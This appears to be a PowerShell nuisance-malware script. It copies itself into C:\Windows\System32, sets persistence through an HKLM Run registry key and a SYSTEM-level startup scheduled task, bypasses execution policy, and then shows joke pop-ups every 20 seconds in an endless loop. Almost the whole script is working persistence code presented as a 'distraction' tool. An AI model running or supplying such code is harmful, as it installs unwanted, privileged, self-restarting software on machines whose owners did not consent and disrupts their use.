# Create the Pop-up Distraction Script
function Show-RandomJoke {
    # List of jokes for distraction
    $jokes = @(
        "Why don’t skeletons fight each other? They don’t have the guts.",
        "I told my computer I needed a break, and now it won’t stop sending me kit-kats.",
        "I used to be a baker, but I couldn't make enough dough.",
        "I'm reading a book on anti-gravity. It's impossible to put down!",
        "Why don't oysters donate to charity? Because they are shellfish."
    )

    # Choose a random joke from the list
    $randomJoke = $jokes | Get-Random

    # Show a message box with the joke
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show($randomJoke, "Random Joke", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
}

# Ensure Persistence via Registry (Run on Startup)
function Set-RegistryPersistence {
    Write-Host "[*] Adding registry persistence..."
    $scriptPath = "C:\Windows\System32\random_joke.ps1"
    Copy-Item $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
                     -Name "RandomJokeScript" `
                     -Value "powershell -ExecutionPolicy Bypass -File $scriptPath" -Force
    Write-Host "[+] Persistence added via registry."
}

# Ensure Persistence via Scheduled Task (Run at Startup)
function Set-ScheduledTaskPersistence {
    Write-Host "[*] Creating scheduled task for persistence..."
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Windows\System32\random_joke.ps1"
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    Register-ScheduledTask -TaskName "RandomJokeTask" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force
    Write-Host "[+] Persistence added via scheduled task."
}

# Main Execution: Set persistence and start the joke display loop
Set-RegistryPersistence
Set-ScheduledTaskPersistence

# Loop to Show Jokes every 20 seconds
Write-Host "[+] Starting Random Joke Distraction..."
while ($true) {
    Show-RandomJoke
    Start-Sleep -Seconds 20 # Show a joke every 20 seconds
}
